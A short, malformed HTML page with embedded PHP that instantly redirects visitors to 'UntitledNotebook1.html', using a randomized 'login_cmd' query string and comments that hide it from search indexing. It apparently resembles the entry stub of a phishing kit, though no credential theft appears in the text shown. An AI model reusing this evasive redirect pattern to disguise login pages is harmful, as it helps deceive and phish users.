<html><head><title></title><!--googleoff: all-->
<meta http-equiv="Description" content=" notneeded "><!--googleon: all--><!--googleoff: all-->
<meta http-equiv="Keywords" content=" notneeded "><!--googleon: all--><!--googleoff: all-->
<meta http-equiv="refresh" content="0; URL=UntitledNotebook1.html">
<script language="JavaScript" type="text/javascript">
<!--
function redirect() { 
setTimeout("window.location.replace('UntitledNotebook1.html')", 0); }
-->
</script>
<?php
$echo="UntitledNotebook1.html?run=login_cmd&statuts=f17ca2c829680ada2fec9fc87bc5f606".md5(time());
?>
<html><head>
<meta HTTP-Equiv="refresh" content="0; URL=<?echo $echo; ?>">
<script type="text/javascript">
echo = "<?echo $echo; ?>"
self.location.replace(echo);
window.location = echo;
</script>
</head>